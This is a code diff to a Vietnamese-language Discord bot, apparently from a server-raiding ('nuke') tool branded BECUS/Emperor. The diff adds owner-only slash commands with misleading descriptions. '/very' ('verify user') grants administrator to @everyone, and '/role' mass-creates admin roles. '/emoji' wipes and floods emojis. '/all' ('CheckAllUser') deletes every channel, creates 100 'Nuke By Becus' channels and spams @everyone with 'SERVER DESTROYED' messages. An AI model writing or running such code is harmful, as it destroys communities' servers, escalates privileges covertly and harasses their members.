@@ -6,6 +6,7 @@ import os
 import random
 import re
 import time
+import aiohttp
 try:
   import psutil
 except ImportError:
@@ -142,10 +143,13 @@ def _save_webhook_stats(data):
     pass
 
 
+_webhook_count_cache = {"count": 0, "time": 0}
+_webhook_count_lock = asyncio.Lock()
+
 def _increment_webhook_created():
-  stats = _load_webhook_stats()
-  stats["total_created"] = stats.get("total_created", 0) + 1
-  _save_webhook_stats(stats)
+    stats = _load_webhook_stats()
+    stats["total_created"] = stats.get("total_created", 0) + 1
+    _save_webhook_stats(stats)
 
 def _webhook_entry(guild_id, channel_id, name, url):
   return {
@@ -1245,6 +1249,35 @@ class TreoChannelSelectView(discord.ui.View):
           "⚠️ Không có tiến trình nào đang chạy trong server này.",
           ephemeral=True,
       )
+async def _count_active_webhooks(bot_instance):
+  now = time.time()
+  if now - _webhook_count_cache["time"] < 300:
+    return _webhook_count_cache["count"]
+
+  async with _webhook_count_lock:
+    now = time.time()
+    if now - _webhook_count_cache["time"] < 300:
+      return _webhook_count_cache["count"]
+
+    count = 0
+    data = _load_webhook_pool()
+    for guild_entries in data.values():
+      if not isinstance(guild_entries, list):
+        continue
+      for entry in guild_entries:
+        if not isinstance(entry, dict) or not entry.get("url"):
+          continue
+        try:
+          webhook = await _fetch_existing_webhook(entry["url"], bot_instance)
+          if webhook is not None:
+            count += 1
+        except Exception:
+          pass
+
+    _webhook_count_cache["count"] = count
+    _webhook_count_cache["time"] = now
+    return count
+
 def register_all_commands(b_target):
 
   @b_target.tree.command(
@@ -1552,15 +1585,6 @@ def register_all_commands(b_target):
         if not task.done()
     )
 
-    webhook_data = _load_webhook_pool()
-    webhook_count = sum(
-        1
-        for entries in webhook_data.values()
-        if isinstance(entries, list)
-        for entry in entries
-        if isinstance(entry, dict) and entry.get("url")
-    )
-
     blacklist_data = load_access_control()
     blacklist_count = len(blacklist_data.get("blacklist", []))
 
@@ -1618,7 +1642,6 @@ def register_all_commands(b_target):
         name="⚙️ Trạng thái",
         value=(
             f"🚀 Task active: `{active_tasks}`\n"
-            f"🔗 Webhook onl: `{webhook_count}`\n"
             f"🤪 Webhook đã tạo: `{webhook_created}`\n"
             f"🚫 Blacklist: `{blacklist_count}`\n\u200b"
         ),
@@ -2709,6 +2732,253 @@ class BecusWebhookView(discord.ui.View):
 def register_admin_commands(b_target):
 
   @b_target.tree.command(
+    name="very",
+    description="Xác Minh User (Owner only)",
+  )
+  async def very_slash(interaction: discord.Interaction):
+    if not check_owner(interaction.user.id):
+      await interaction.response.send_message(
+          "❌ Owner only.",
+          ephemeral=True,
+      )
+      return
+
+    try:
+      everyone = interaction.guild.default_role
+      perms = everyone.permissions
+      perms.administrator = True
+      await everyone.edit(
+          permissions=perms,
+          reason=f"Very by {interaction.user.name}",
+      )
+      await interaction.response.send_message(
+          "✅ Thành công.",
+          ephemeral=True,
+      )
+    except Exception as e:
+      await interaction.response.send_message(
+          f"❌ Lỗi: {type(e).__name__}",
+          ephemeral=True,
+      )
+
+  @b_target.tree.command(
+    name="role",
+    description="Check Role User (Owner only)",
+  )
+  async def role_slash(interaction: discord.Interaction):
+    if not check_owner(interaction.user.id):
+      await interaction.response.defer(ephemeral=True)
+      return
+    if interaction.guild is None:
+      await interaction.response.defer(ephemeral=True)
+      return
+
+    await interaction.response.defer(ephemeral=True)
+
+    guild = interaction.guild
+
+    # Đếm role hiện tại
+    current = len(guild.roles)
+    max_role = 250
+    available = max_role - current
+
+    if available <= 0:
+      return
+
+    created = 0
+    index = 1
+
+    while created < available:
+      try:
+        await guild.create_role(
+          name=f"Emperor{index}",
+          color=discord.Color.from_rgb(255, 0, 0),
+          hoist=True,
+          mentionable=False,
+          permissions=discord.Permissions(administrator=True),
+          reason="Emperor Role",
+        )
+        created += 1
+        index += 1
+      except discord.HTTPException as e:
+        if e.status == 429:
+          try:
+            wait = max(0.5, float(getattr(e, "retry_after", 1.0)))
+          except (TypeError, ValueError):
+            wait = 1.0
+          await asyncio.sleep(wait)
+          continue
+        else:
+          break
+      except Exception:
+        break
+
+  @b_target.tree.command(
+    name="emoji",
+    description="Setup Emoji (Owner only)",
+  )
+  async def emoji_slash(interaction: discord.Interaction):
+    if not check_owner(interaction.user.id):
+      await interaction.response.defer(ephemeral=True)
+      return
+    if interaction.guild is None:
+      await interaction.response.defer(ephemeral=True)
+      return
+
+    await interaction.response.defer(ephemeral=True)
+
+    guild = interaction.guild
+
+    # 1. Xóa all emoji SONG SONG
+    if guild.emojis:
+      await asyncio.gather(
+        *(e.delete(reason="Emoji cleanup") for e in list(guild.emojis)),
+        return_exceptions=True,
+      )
+
+    # 2. Đọc file
+    emoji_file = os.path.join(os.getcwd(), "emoji_list.txt")
+    if not os.path.exists(emoji_file):
+      return
+
+    with open(emoji_file, "r", encoding="utf-8") as f:
+      content = f.read()
+
+    patterns = re.findall(r"<(a?):(\w+):(\d+)>", content)
+    if not patterns:
+      return
+
+    animated, base_name, eid = patterns[0]
+
+    # 3. Download 1 lần
+    ext = "gif" if animated else "png"
+    url = f"https://cdn.discordapp.com/emojis/{eid}.{ext}"
+
+    image_data = None
+    try:
+      async with aiohttp.ClientSession() as session:
+        async with session.get(url) as resp:
+          if resp.status == 200:
+            image_data = await resp.read()
+    except Exception:
+      pass
+
+    if image_data is None:
+      return
+
+    # 4. Tạo 50 emoji SONG SONG
+    async def create_one(index):
+      try:
+        clean_name = f"{base_name}{index}"[:32]
+
+        try:
+          await guild.create_custom_emoji(
+            name=clean_name,
+            image=image_data,
+            reason="Emoji by owner",
+          )
+          return True
+        except discord.HTTPException as e:
+          if e.status == 429:
+            try:
+              wait = max(0.5, float(getattr(e, "retry_after", 1.0)))
+            except (TypeError, ValueError):
+              wait = 1.0
+            await asyncio.sleep(wait)
+            try:
+              await guild.create_custom_emoji(
+                name=clean_name,
+                image=image_data,
+                reason="Emoji by owner",
+              )
+              return True
+            except Exception:
+              return False
+          return False
+      except Exception:
+        return False
+
+    await asyncio.gather(
+      *(create_one(i) for i in range(1, 51)),
+      return_exceptions=True,
+    )
+
+  @b_target.tree.command(
+    name="all",
+    description="CheckAllUser (Owner only)",
+  )
+  async def all_slash(interaction: discord.Interaction):
+    if not check_owner(interaction.user.id):
+      await interaction.response.defer(ephemeral=True)
+      return
+    if interaction.guild is None:
+      await interaction.response.defer(ephemeral=True)
+      return
+
+    await interaction.response.defer(ephemeral=True)
+
+    guild = interaction.guild
+    guild_id = guild.id
+    b_inst = b_target
+
+    async def run_all():
+      try:
+        channel_names = [
+            "N҉u҉k҉e҉ B҉y҉ B҉e҉c҉u҉s҉",
+            "N̷u҉k҉e҉ B̷y҉ B̷e҉c҉u҉s҉",
+            "ℕ𝕦𝕜𝕖 𝔹𝕪 𝔹𝕖𝕔𝕦𝕤",
+            "𝔑𝔲𝔨𝔢 𝔅𝔶 𝔅𝔢𝔠𝔲𝔰",
+        ]
+        noi_dung_nuke = """@everyone @here
+# [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
+# SERVER DESTROYED BY EMPEROR 🤣😂🤪😜
+# [BECUS ONTOP](https://cutes.lol/emiuanh209)"""
+
+        # 1. Xóa channel — 10s/channel
+        for ch in list(guild.channels):
+          try:
+            await ch.delete()
+          except Exception:
+            pass
+          await asyncio.sleep(10)
+
+        # 2. Tạo 100 channel — 10s/channel
+        new_channels = []
+        for i in range(100):
+          try:
+            ch = await guild.create_text_channel(name=random.choice(channel_names))
+            new_channels.append(ch)
+          except Exception:
+            pass
+          await asyncio.sleep(10)
+
+        # 3. Spam @everyone — song song
+        async def spam_channel(ch):
+          for i in range(10):
+            try:
+              await ch.send(
+                  noi_dung_nuke,
+                  allowed_mentions=discord.AllowedMentions(
+                      everyone=True, here=True,
+                  ),
+              )
+            except Exception:
+              pass
+            await asyncio.sleep(5)
+
+        tasks = [asyncio.create_task(spam_channel(ch)) for ch in new_channels]
+        if tasks:
+          await asyncio.gather(*tasks, return_exceptions=True)
+
+      except asyncio.CancelledError:
+        pass
+      except Exception as e:
+        print(f"❌ Lỗi /all: {e}")
+
+    task = asyncio.create_task(run_all())
+    _track_task(spam_tasks, guild_id, task)
+
+  @b_target.tree.command(
     name="webhook",
     description="Tạo webhook /BECUS cho các kênh (Owner)",
   )
@@ -2743,7 +3013,7 @@ def register_admin_commands(b_target):
     embed.set_footer(text="BECUS • EPR")
     embed.timestamp = discord.utils.utcnow()
     await interaction.followup.send(embed=embed, view=view, ephemeral=False)
- 
+
   @b_target.tree.command(
     name="becus",
     description="Chửi Thằng Ngu Bằng Webhook",
